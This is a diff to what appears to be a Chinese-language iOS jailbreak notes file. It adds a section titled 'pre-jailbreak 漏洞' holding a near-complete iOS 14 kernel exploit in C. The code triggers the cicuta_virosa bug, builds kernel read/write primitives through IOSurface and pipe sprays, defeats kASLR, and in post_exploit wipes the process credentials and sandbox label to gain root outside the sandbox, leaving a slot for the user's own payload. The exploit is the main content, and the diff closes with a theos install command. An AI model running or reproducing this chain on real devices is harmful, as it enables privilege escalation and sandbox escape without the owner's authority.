@@ -8,6 +8,489 @@
 
 <img src="https://upload-images.jianshu.io/upload_images/1155391-084275e043ff1f1c.png?imageMogr2/auto-orient/strip|imageView2/2/w/928/format/webp" width="400" height="667" align="bottom" />
 
+## pre-jailbreak 漏洞
+```
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <stdbool.h>
+#include <mach/mach.h>
+
+#include "mycommon.h"
+#include "k_offsets.h"
+#include "utils.h"
+#include "k_utils.h"
+#include "kapi.h"
+#include "user_kernel_alloc.h"
+#include "cicuta_virosa/cicuta_virosa.h"
+
+extern mach_port_t IOSurfaceRootUserClient;
+uint32_t iosurface_create_fast(void);
+uint32_t iosurface_s_get_ycbcrmatrix(void);
+void iosurface_s_set_indexed_timestamp(uint64_t v);
+
+static int *pipefds;
+static size_t pipe_buffer_size = 0x1000;
+static uint8_t *pipe_buffer;
+static kptr_t IOSurfaceRoot_uc;
+
+static void read_pipe()
+{
+    size_t read_size = pipe_buffer_size - 1;
+    ssize_t count = read(pipefds[0], pipe_buffer, read_size);
+    if (count == read_size) {
+        return;
+    } else if (count == -1) {
+        perror("read_pipe");
+        util_error("could not read pipe buffer");
+    } else if (count == 0) {
+        util_error("pipe is empty");
+    } else {
+        util_error("partial read %zu of %zu bytes", count, read_size);
+    }
+    fail_info(__FUNCTION__);
+}
+
+static void write_pipe()
+{
+    size_t write_size = pipe_buffer_size - 1;
+    ssize_t count = write(pipefds[1], pipe_buffer, write_size);
+    if (count == write_size) {
+        return;
+    } else if (count < 0) {
+        util_error("could not write pipe buffer");
+    } else if (count == 0) {
+        util_error("pipe is full");
+    } else {
+        util_error("partial write %zu of %zu bytes", count, write_size);
+    }
+    fail_info(__FUNCTION__);
+}
+
+static void build_stable_kmem_api()
+{
+    static kptr_t pipe_base;
+    kptr_t p_fd = kapi_read_kptr(g_exp.self_proc + OFFSET(proc, p_fd));
+    kptr_t fd_ofiles = kapi_read_kptr(p_fd + OFFSET(filedesc, fd_ofiles));
+    kptr_t rpipe_fp = kapi_read_kptr(fd_ofiles + sizeof(kptr_t) * pipefds[0]);
+    kptr_t fp_glob = kapi_read_kptr(rpipe_fp + OFFSET(fileproc, fp_glob));
+    kptr_t rpipe = kapi_read_kptr(fp_glob + OFFSET(fileglob, fg_data));
+    pipe_base = kapi_read_kptr(rpipe + OFFSET(pipe, buffer));
+
+    // XXX dirty hack, but I'm lucky :)
+    uint8_t bytes[20];
+    read_20(IOSurfaceRoot_uc + OFFSET(IOSurfaceRootUserClient, surfaceClients) - 4, bytes);
+    *(kptr_t *)(bytes + 4) = pipe_base;
+    write_20(IOSurfaceRoot_uc + OFFSET(IOSurfaceRootUserClient, surfaceClients) - 4, bytes);
+
+    // iOS 14.x only
+    struct fake_client {
+        kptr_t pad_00; // can not use IOSurface 0 now
+        kptr_t uc_obj;
+        uint8_t pad_10[0x40]; // start of IOSurfaceClient obj
+        kptr_t surf_obj;
+        uint8_t pad_58[0x360 - 0x58];
+        kptr_t shared_RW;
+    };
+
+    stage0_read32 = ^uint32_t (kptr_t addr) {
+        struct fake_client *p = (void *)pipe_buffer;
+        p->uc_obj = pipe_base + 16;
+        p->surf_obj = addr - 0xb4;
+        write_pipe();
+        uint32_t v = iosurface_s_get_ycbcrmatrix();
+        read_pipe();
+        return v;
+    };
+
+    stage0_read64 = ^uint64_t (kptr_t addr) {
+        uint64_t v = stage0_read32(addr);
+        v |= (uint64_t)stage0_read32(addr + 4) << 32;
+        return v;
+    };
+
+    stage0_read_kptr = ^kptr_t (kptr_t addr) {
+        uint64_t v = stage0_read64(addr);
+        if (v && (v >> 39) != 0x1ffffff) {
+            if (g_exp.debug) {
+                util_info("PAC %#llx -> %#llx", v, v | 0xffffff8000000000);
+            }
+            v |= 0xffffff8000000000; // untag, 25 bits
+        }
+        return (kptr_t)v;
+    };
+
+    stage0_read = ^void (kptr_t addr, void *data, size_t len) {
+        uint8_t *_data = data;
+        uint32_t v;
+        size_t pos = 0;
+        while (pos < len) {
+            v = stage0_read32(addr + pos);
+            memcpy(_data + pos, &v, len - pos >= 4 ? 4 : len - pos);
+            pos += 4;
+        }
+    };
+
+    stage0_write64 = ^void (kptr_t addr, uint64_t v) {
+        struct fake_client *p = (void *)pipe_buffer;
+        p->uc_obj = pipe_base + 0x10;
+        p->surf_obj = pipe_base;
+        p->shared_RW = addr;
+        write_pipe();
+        iosurface_s_set_indexed_timestamp(v);
+        read_pipe();
+    };
+
+    stage0_write = ^void (kptr_t addr, void *data, size_t len) {
+        uint8_t *_data = data;
+        uint64_t v;
+        size_t pos = 0;
+        while (pos < len) {
+            size_t bytes = 8;
+            if (bytes > len - pos) {
+                bytes = len - pos;
+                v = stage0_read64(addr + pos);
+            }
+            memcpy(&v, _data + pos, bytes);
+            stage0_write64(addr + pos, v);
+            pos += 8;
+        }
+    };
+}
+
+static void build_stage0_kmem_api()
+{
+    stage0_read32 = ^uint32_t (kptr_t addr) {
+        uint32_t v = read_32(addr);
+        return v;
+    };
+
+    stage0_read64 = ^uint64_t (kptr_t addr) {
+        uint64_t v = read_64(addr);
+        return v;
+    };
+
+    stage0_read_kptr = ^kptr_t (kptr_t addr) {
+        uint64_t v = stage0_read64(addr);
+        if (v && (v >> 39) != 0x1ffffff) {
+            if (g_exp.debug) {
+                util_info("PAC %#llx -> %#llx", v, v | 0xffffff8000000000);
+            }
+            v |= 0xffffff8000000000; // untag, 25 bits
+        }
+        return (kptr_t)v;
+    };
+
+    stage0_read = ^void (kptr_t addr, void *data, size_t len) {
+        uint8_t *_data = data;
+        uint64_t v;
+        size_t pos = 0;
+        while (pos < len) {
+            v = stage0_read64(addr + pos);
+            memcpy(_data + pos, &v, len - pos >= 8 ? 8 : len - pos);
+            pos += 8;
+        }
+    };
+
+    stage0_write64 = ^void (kptr_t addr, uint64_t v) {
+        stage0_write(addr, &v, sizeof(v));
+    };
+
+    stage0_write = ^void (kptr_t addr, void *data, size_t len) {
+        uint8_t *_data = data;
+        uint8_t v[20];
+        size_t pos = 0;
+        while (pos < len) {
+            size_t bytes = 20;
+            if (bytes > len - pos) {
+                bytes = len - pos;
+                read_20(addr + pos, v);
+            }
+            memcpy(v, _data + pos, bytes);
+            write_20(addr + pos, v);
+            pos += 20;
+        }
+    };
+}
+
+void exploit_main(void)
+{
+    sys_init();
+    kernel_offsets_init();
+    bool ok = IOSurface_init();
+    fail_if(!ok, "can not init IOSurface lib");
+    uint32_t surf_id = iosurface_create_fast();
+    util_info("surface_id %u", surf_id);
+    size_t pipe_count = 1;
+    pipefds = create_pipes(&pipe_count);
+    pipe_buffer = (uint8_t *)malloc(pipe_buffer_size);
+    memset_pattern4(pipe_buffer, "pipe", pipe_buffer_size);
+    pipe_spray(pipefds, 1, pipe_buffer, pipe_buffer_size, NULL);
+    read_pipe();
+
+    // open the door to iOS 14
+    cicuta_virosa();
+
+    build_stage0_kmem_api();
+
+    g_exp.self_ipc_space = kapi_read_kptr(g_exp.self_task + OFFSET(task, itk_space));
+    g_exp.self_proc = kapi_read_kptr(g_exp.self_task + OFFSET(task, bsd_info));
+
+    kptr_t IOSurfaceClient_obj;
+    {
+        kptr_t entry = ipc_entry_lookup(IOSurfaceRootUserClient);
+        kptr_t object = kapi_read_kptr(entry + OFFSET(ipc_entry, ie_object));
+        kptr_t kobject = kapi_read_kptr(object + OFFSET(ipc_port, ip_kobject));
+        IOSurfaceRoot_uc = kobject;
+        kptr_t surfaceClients = kapi_read_kptr(kobject + OFFSET(IOSurfaceRootUserClient, surfaceClients));
+        IOSurfaceClient_obj = kapi_read_kptr(surfaceClients + sizeof(kptr_t) * surf_id);
+    }
+
+    util_info("build stable kernel r/w primitives");
+    build_stable_kmem_api();
+    util_info("---- done ----");
+
+    kptr_t vt_ptr = kapi_read64(IOSurfaceClient_obj);
+    if ((vt_ptr >> 39) != 0x1ffffff) {
+        g_exp.has_PAC = true;
+    }
+
+    util_info("defeat kASLR");
+
+    kptr_t IOSurfaceClient_vt;
+    kptr_t IOSurfaceClient_vt_0;
+    IOSurfaceClient_vt = kapi_read_kptr(IOSurfaceClient_obj);
+    IOSurfaceClient_vt_0 = kapi_read_kptr(IOSurfaceClient_vt);
+
+    util_info("vt %#llx, vt[0] %#llx", IOSurfaceClient_vt, IOSurfaceClient_vt_0);
+    util_msleep(100);
+
+    // device&OS dependent
+    kptr_t text_slide = IOSurfaceClient_vt_0 - kc_IOSurfaceClient_vt_0;
+    kptr_t data_slide = IOSurfaceClient_vt - kc_IOSurfaceClient_vt;
+
+    kptr_t kernel_base = kc_kernel_base + text_slide;
+    kptr_t kernel_map = kc_kernel_map + data_slide;
+    kptr_t kernel_task = kc_kernel_task + data_slide;
+
+    kptr_t kernel_map_ptr;
+    kernel_map_ptr = kapi_read_kptr(kernel_map);
+
+    kptr_t kernel_task_ptr;
+    kernel_task_ptr = kapi_read_kptr(kernel_task);
+
+    util_info("kernel slide %#llx", text_slide);
+    util_info("kernel base %#llx, kernel_map < %#llx: %#llx >", kernel_base, kernel_map, kernel_map_ptr);
+
+    util_info("verify kernel header");
+#ifdef __arm64e__
+    const uint32_t mach_header[4] = { 0xfeedfacf, 0x0100000c, 0xc0000002, 2 };
+#else
+    const uint32_t mach_header[4] = { 0xfeedfacf, 0x0100000c, 0, 2 };
+#endif
+    uint32_t data[4] = {};
+    kapi_read(kernel_base, data, sizeof(mach_header));
+    util_hexprint_width(data, sizeof(data), 4, "_mh_execute_header");
+    int diff = memcmp(mach_header, data, sizeof(uint32_t [2]));
+    fail_if(diff, "mach_header mismatch");
+
+    g_exp.kernel_task = kernel_task_ptr;
+    g_exp.kernel_proc = kapi_read_kptr(g_exp.kernel_task + OFFSET(task, bsd_info));
+
+    if (g_exp.debug) {
+        util_info("---- dump kernel cred ----");
+        debug_dump_proc_cred(g_exp.kernel_proc);
+        util_info("---- dump self cred ----");
+        debug_dump_proc_cred(g_exp.self_proc);
+    }
+
+    post_exploit();
+
+    // clean KHEAP by yourself
+}
+
+```
+
+```
+//  post_exploit.c
+
+#include <stdio.h>
+#include <string.h>
+#include <stdlib.h>
+#include <pthread.h>
+#include <unistd.h>
+#include <signal.h>
+#include <fcntl.h>
+#include <sys/mman.h>
+#include <sys/stat.h>
+#include <mach/mach.h>
+#include <copyfile.h>
+#include "mycommon.h"
+#include "utils.h"
+#include "k_utils.h"
+#include "kapi.h"
+#include "k_offsets.h"
+
+#define copyfile(X,Y) (copyfile)(X, Y, 0, COPYFILE_ALL|COPYFILE_RECURSIVE|COPYFILE_NOFOLLOW_SRC);
+#define JAILB_ROOT "/private/var/containers/Bundle/jb_resources/"
+static const char *jailb_root = JAILB_ROOT;
+
+char *Build_resource_path(char *filename);
+void patch_amfid(pid_t amfid_pid);
+
+#define PROC_ALL_PIDS        1
+extern int proc_listpids(uint32_t type, uint32_t typeinfo, void *buffer, int buffersize);
+extern int proc_pidpath(int pid, void * buffer, uint32_t  buffersize);
+
+pid_t look_for_proc_internal(const char *name, bool (^match)(const char *path, const char *want))
+{
+    pid_t *pids = calloc(1, 3000 * sizeof(pid_t));
+    int procs_cnt = proc_listpids(PROC_ALL_PIDS, 0, pids, 3000);
+    if(procs_cnt > 3000) {
+        pids = realloc(pids, procs_cnt * sizeof(pid_t));
+        procs_cnt = proc_listpids(PROC_ALL_PIDS, 0, pids, procs_cnt);
+    }
+    int len;
+    char pathBuffer[4096];
+    for (int i=(procs_cnt-1); i>=0; i--) {
+        if (pids[i] == 0) {
+            continue;
+        }
+        memset(pathBuffer, 0, sizeof(pathBuffer));
+        len = proc_pidpath(pids[i], pathBuffer, sizeof(pathBuffer));
+        if (len == 0) {
+            continue;
+        }
+        if (match(pathBuffer, name)) {
+            free(pids);
+            return pids[i];
+        }
+    }
+    free(pids);
+    return 0;
+}
+
+pid_t look_for_proc(const char *proc_name)
+{
+    return look_for_proc_internal(proc_name, ^bool (const char *path, const char *want) {
+        if (!strcmp(path, want)) {
+            return true;
+        }
+        return false;
+    });
+}
+
+pid_t look_for_proc_basename(const char *base_name)
+{
+    return look_for_proc_internal(base_name, ^bool (const char *path, const char *want) {
+        const char *base = path;
+        const char *last = strrchr(path, '/');
+        if (last) {
+            base = last + 1;
+        }
+        if (!strcmp(base, want)) {
+            return true;
+        }
+        return false;
+    });
+}
+
+void patch_TF_PLATFORM(kptr_t task)
+{
+    uint32_t t_flags = kapi_read32(task + OFFSET(task, t_flags));
+    util_info("old t_flags %#x", t_flags);
+
+    t_flags |= 0x00000400; // TF_PLATFORM
+    kapi_write32(task + OFFSET(task, t_flags), t_flags);
+    t_flags = kapi_read32(task + OFFSET(task, t_flags));
+    util_info("new t_flags %#x", t_flags);
+
+    // used in kernel func: csproc_get_platform_binary
+}
+
+struct proc_cred {
+    char posix_cred[0x100]; // HACK big enough
+    kptr_t cr_label;
+    kptr_t sandbox_slot;
+};
+
+void proc_set_root_cred(kptr_t proc, struct proc_cred **old_cred)
+{
+    *old_cred = NULL;
+    kptr_t p_ucred = kapi_read_kptr(proc + OFFSET(proc, p_ucred));
+    kptr_t cr_posix = p_ucred + OFFSET(ucred, cr_posix);
+
+    size_t cred_size = SIZE(posix_cred);
+    char zero_cred[cred_size];
+    struct proc_cred *cred_label;
+    fail_if(cred_size > sizeof(cred_label->posix_cred), "struct proc_cred should be bigger");
+    cred_label = malloc(sizeof(*cred_label));
+
+    kapi_read(cr_posix, cred_label->posix_cred, cred_size);
+    cred_label->cr_label = kapi_read64(cr_posix + SIZE(posix_cred));
+    cred_label->sandbox_slot = 0;
+
+    if (cred_label->cr_label) {
+        kptr_t cr_label = cred_label->cr_label | 0xffffff8000000000; // untag, 25 bits
+        cred_label->sandbox_slot = kapi_read64(cr_label + 0x10);
+        kapi_write64(cr_label + 0x10, 0x0);
+    }
+
+    memset(zero_cred, 0, cred_size);
+    kapi_write(cr_posix, zero_cred, cred_size);
+    *old_cred = cred_label;
+}
+
+void proc_restore_cred(kptr_t proc, struct proc_cred *old_cred)
+{
+    // TODO
+}
+
+#pragma mark ---- Post-exp main entry ----
+
+void post_exploit(void)
+{
+    util_info("update proc_self credential");
+    // can not do this under PAC
+    //kapi_write64(g_exp.self_proc + OFFSET(proc, p_ucred), kernelCredAddr);
+    struct proc_cred *old_cred;
+    proc_set_root_cred(g_exp.self_proc, &old_cred);
+    util_msleep(100);
+
+    int err = setuid(0);
+    if (err) {
+        perror("setuid");
+    }
+
+    // Test writing to the outer worlds
+    if (1) { // ok
+        FILE *fp = fopen("/var/mobile/test.txt", "wb");
+        fail_if(fp == NULL, "failed to write /var/mobile/test.txt");
+        util_info("wrote test file: %p", fp);
+        fprintf(fp, "hello from pattern-f\n");
+        fclose(fp);
+    }
+
+    util_info("now we are out of sandbox, check \"/bin/ps -p 1\"");
+    // test exec command
+    //util_runCommand("/bin/ls", NULL); // not privided by Apple
+    util_runCommand("/bin/ps", "-p", "1", NULL); // built-in tools
+
+    //patch_TF_PLATFORM(g_exp.self_task);
+
+    // ----------------------------------------------------------------------
+    //
+    util_info("TODO insert your code here");
+    //
+    // ----------------------------------------------------------------------
+
+    proc_restore_cred(g_exp.self_proc, old_cred);
+    free(old_cred);
+}
+
+```
+
 ## 安装最新版本theos终端命令行
 ```
 $ sudo git clone --recursive https://github.com/theos/theos.git /opt/theos
